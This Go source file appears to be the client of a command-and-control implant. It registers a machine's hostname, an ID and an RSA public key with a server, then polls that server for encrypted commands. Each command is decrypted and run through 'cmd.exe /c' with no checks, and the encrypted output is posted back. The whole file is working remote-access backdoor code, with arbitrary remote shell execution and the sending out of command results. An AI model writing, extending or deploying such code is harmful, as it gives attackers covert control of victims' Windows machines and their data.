package core

import (
	"bytes"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/google/uuid"
)

const UNKNOWN_HOST = "UNKNOWN"
const KEYBIT_SIZE = 2048

var DefaultConfig = ClientConfig{ServerHost: "http://localhost", CommunicationEp: "command", RecognitionEp: "client"}

var DefaultIdenResult = &IdentificationResult{}
var EmptyCommand = &Command{}

func (client *Client) InitClient() bool {
	uuid := uuid.New()
	hostName, err := os.Hostname()

	client.History = []Command{}

	if err != nil {
		hostName = UNKNOWN_HOST
	}

	key, err := rsa.GenerateKey(rand.Reader, KEYBIT_SIZE)

	if err != nil {
		return false
	}

	client.Id = uuid.String()
	client.Hostname = hostName

	client.Security = Security{
		PublicKey:  key.PublicKey,
		PrivateKey: key,
	}

	client.HttpClient = *http.DefaultClient

	client.Config = DefaultConfig

	return true
}

func (client *Client) IdentifyToServer() (*IdentificationResult, error) {
	config := client.Config
	httpClient := client.HttpClient

	idenPayload := Identification{Hostname: client.Hostname, Id: client.Id, PublicKey: client.Security.PublicKey}

	mIdenPayload, err := json.Marshal(idenPayload)

	if err != nil {
		return DefaultIdenResult, err
	}

	req, err := http.NewRequest(
		"POST",
		fmt.Sprintf("%s/%s", config.ServerHost, config.RecognitionEp),
		bytes.NewReader(mIdenPayload),
	)

	if err != nil {
		return DefaultIdenResult, nil
	}

	reqHeader := req.Header
	reqHeader.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)

	if err != nil {
		return DefaultIdenResult, err
	}

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return DefaultIdenResult, err
	}

	var idenResult IdentificationResult

	mErr := json.Unmarshal(body, &idenResult)

	if mErr != nil {
		return DefaultIdenResult, mErr
	}

	client.Server = idenResult

	return &idenResult, nil
}

func (client *Client) FetchCommand() (*Command, error) {
	config := client.Config
	httpClient := client.HttpClient
	clientSec := client.Security

	cmdReqInfo := CommandRequest{Id: client.Id}
	cmdReqInfoPayload, err := json.Marshal(cmdReqInfo)

	if err != nil {
		return EmptyCommand, nil
	}

	req, err := http.NewRequest(
		"GET",
		fmt.Sprintf("%s/%s", config.ServerHost, config.CommunicationEp),
		bytes.NewReader(cmdReqInfoPayload),
	)

	if err != nil {
		return EmptyCommand, err
	}

	resp, err := httpClient.Do(req)

	if err != nil {
		return EmptyCommand, err
	}

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return EmptyCommand, err
	}

	var encryptedCommand EncryptedCommand

	mErr := json.Unmarshal(body, &encryptedCommand)

	if mErr != nil {
		return EmptyCommand, err
	}

	encryptedContent := encryptedCommand.EncryptedContent
	cmdBytes, err := clientSec.PrivateKey.Decrypt(nil, encryptedContent, &rsa.OAEPOptions{Hash: crypto.SHA256})

	if err != nil {
		return EmptyCommand, err
	}

	fetchedCommand := Command{Content: string(cmdBytes), ReceivedAt: time.Now(), Id: encryptedCommand.Id}

	return &fetchedCommand, nil
}

func (client *Client) ExecuteCmd(command Command) *exec.Cmd {
	content := command.Content
	excCmd := exec.Command("cmd.exe", "/c", content)

	client.History = append(client.History, command)
	return excCmd
}

func (client *Client) GetLastExecutedCmd() *Command {
	history := client.History
	if len(history) <= 0 {
		return &Command{}
	}
	return &client.History[len(history)-1]
}

func (client *Client) SendCmdOutput(cmd *exec.Cmd, cmdId string) error {
	config := client.Config
	httpClient := client.HttpClient

	output, err := cmd.Output()

	if err != nil {
		return err
	}

	encryptedOutput, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		&client.Server.PublicKey,
		output,
		nil)

	if err != nil {
		return err
	}

	encCmdRes := EncryptedCommandResult{
		Id:              cmdId,
		EncryptedOutput: encryptedOutput,
	}

	encCmdResPayload, err := json.Marshal(encCmdRes)

	if err != nil {
		return err
	}

	req, err := http.NewRequest(
		"POST",
		fmt.Sprintf("%s/%s", config.ServerHost, config.CommunicationEp),
		bytes.NewReader(encCmdResPayload),
	)

	if err != nil {
		return err
	}

	_, rErr := httpClient.Do(req)

	if rErr != nil {
		return rErr
	}

	return nil
}
